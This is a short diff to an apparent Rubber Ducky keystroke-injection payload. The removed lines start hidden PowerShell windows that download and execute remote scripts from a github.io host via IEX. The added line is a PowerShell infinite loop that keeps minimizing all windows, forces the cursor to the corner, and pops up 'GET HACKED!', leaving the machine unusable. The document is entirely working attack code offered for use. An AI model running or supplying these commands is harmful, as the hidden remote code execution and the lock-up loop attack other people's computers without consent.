@@ -1,6 +1,2 @@
-#runs 3 scripts for faster rubber ducky!
-cmd
-start powershell -NoP -NonI -W hidden IEX (New-Object Net.WebClient).DownloadString('https://creepyturnip.github.io/msgboxLoop.ps1')
-start powershell -NoP -NonI -W hidden IEX (New-Object Net.WebClient).DownloadString('https://creepyturnip.github.io/mouseMove.ps1')
-start powershell -NoP -NonI -W hidden IEX (New-Object Net.WebClient).DownloadString('https://creepyturnip.github.io/minimizeAll.ps1')
-
+#One script to rule them all!
+Add-Type -AssemblyName System.Windows.Forms;$shell = New-Object -ComObject "Shell.Application";$wshell = New-Object -ComObject Wscript.Shell;while(1){$shell.minimizeall();[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0);$wshell.Popup("eZZZZZZZZZZZ",1,"GET HACKED!");}
